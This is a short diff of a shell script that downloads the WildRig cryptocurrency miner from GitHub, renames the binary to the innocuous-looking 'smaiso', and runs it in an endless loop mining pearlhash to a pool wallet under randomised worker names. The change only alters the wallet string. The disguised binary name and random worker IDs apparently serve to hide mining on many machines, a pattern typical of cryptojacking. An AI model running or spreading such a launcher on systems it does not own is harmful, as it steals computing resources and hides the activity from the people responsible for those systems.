@@ -3,5 +3,5 @@ wget https://github.com/andru-kun/wildrig-multi/releases/download/0.51.3/wildrig
 tar xf wildrig-multi-linux-0.51.3.tar.gz
 mv wildrig-multi smaiso
 while true; do
-./smaiso --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr@nock=6hGXZTKYnRcERfmxVC6o3jbde8B1soAWcdFPZEsRPZJjw7HgD8H2NWu --worker $(echo $RANDOM | md5sum | head -c 10)
+./smaiso --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr --worker $(echo $RANDOM | md5sum | head -c 10)
 done
